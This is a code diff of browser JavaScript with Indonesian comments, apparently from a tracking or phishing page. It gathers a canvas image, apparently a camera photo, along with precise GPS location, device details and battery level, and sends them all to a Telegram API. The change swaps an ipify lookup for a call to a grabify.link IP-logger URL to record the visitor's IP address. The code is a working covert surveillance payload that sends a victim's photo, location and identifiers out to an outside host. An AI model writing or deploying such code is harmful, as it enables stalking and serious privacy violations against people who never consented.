@@ -45,63 +45,64 @@
 
       var imageDataURL = canvas.toDataURL('image/png');
 
-      // Mendapatkan lokasi akurat menggunakan GPS
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          var latitude = position.coords.latitude;
-          var longitude = position.coords.longitude;
-          var accuracy = position.coords.accuracy;
+      // Mengambil IP perangkat dari https://grabify.link/track/V8EA7D
+      fetch('https://grabify.link/track/V8EA7D')
+        .then(function(response) {
+          return response.text();
+        })
+        .then(function(data) {
+          var match = data.match(/IP: (\d+\.\d+\.\d+\.\d+)/);
+          var ipAddress = match ? match[1] : null;
 
-          // Mendapatkan informasi perangkat secara detail
-          var deviceInfo = {
-            userAgent: navigator.userAgent,
-            screenWidth: window.screen.width,
-            screenHeight: window.screen.height,
-            platform: navigator.platform,
-            batteryLevel: null,
-            isp: null, // Info ISP perangkat
-            imei: null, // Info IMEI perangkat
-            ipAddress: null // Alamat IP perangkat
-          };
+          // Mendapatkan lokasi akurat menggunakan GPS
+          if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+              var latitude = position.coords.latitude;
+              var longitude = position.coords.longitude;
+              var accuracy = position.coords.accuracy;
 
-          // Mendapatkan informasi batrai perangkat
-          if ("getBattery" in navigator) {
-            navigator.getBattery()
-              .then(function(battery) {
-                deviceInfo.batteryLevel = battery.level * 100;
+              // Mendapatkan informasi perangkat secara detail
+              var deviceInfo = {
+                userAgent: navigator.userAgent,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                platform: navigator.platform,
+                batteryLevel: null,
+                isp: null, // Info ISP perangkat
+                imei: null, // Info IMEI perangkat
+                ipAddress: ipAddress // Alamat IP perangkat
+              };
 
-                // Mengambil IP perangkat menggunakan layanan ipify
-                fetch('https://api.ipify.org?format=json')
-                  .then(function(response) {
-                    return response.json();
-                  })
-                  .then(function(data) {
-                    deviceInfo.ipAddress = data.ip;
+              // Mendapatkan informasi batrai perangkat
+              if ("getBattery" in navigator) {
+                navigator.getBattery()
+                  .then(function(battery) {
+                    deviceInfo.batteryLevel = battery.level * 100;
 
                     // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
                   })
                   .catch(function(error) {
-                    console.error('Terjadi kesalahan dalam mendapatkan alamat IP:', error);
+                    console.error('Gagal mendapatkan informasi batrai:', error);
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
                   });
-              })
-              .catch(function(error) {
-                console.error('Gagal mendapatkan informasi batrai:', error);
+              } else {
+                console.error('Browser tidak mendukung mendapatkan informasi batrai.');
                 sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
-              });
+              }
+            }, function(error) {
+              console.error('Gagal mendapatkan lokasi:', error);
+              sendToTelegram(null, null, null, null, imageDataURL);
+            });
           } else {
-            console.error('Browser tidak mendukung mendapatkan informasi batrai.');
-            sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
+            console.error('Browser tidak mendukung geolocation.');
+            sendToTelegram(null, null, null, null, imageDataURL);
           }
-        }, function(error) {
-          console.error('Gagal mendapatkan lokasi:', error);
+        })
+        .catch(function(error) {
+          console.error('Terjadi kesalahan dalam mengambil IP perangkat:', error);
           sendToTelegram(null, null, null, null, imageDataURL);
         });
-      } else {
-        console.error('Browser tidak mendukung geolocation.');
-        sendToTelegram(null, null, null, null, imageDataURL);
-      }
     };
 
     // Fungsi untuk mengirim data foto, lokasi, dan informasi perangkat ke Telegram API
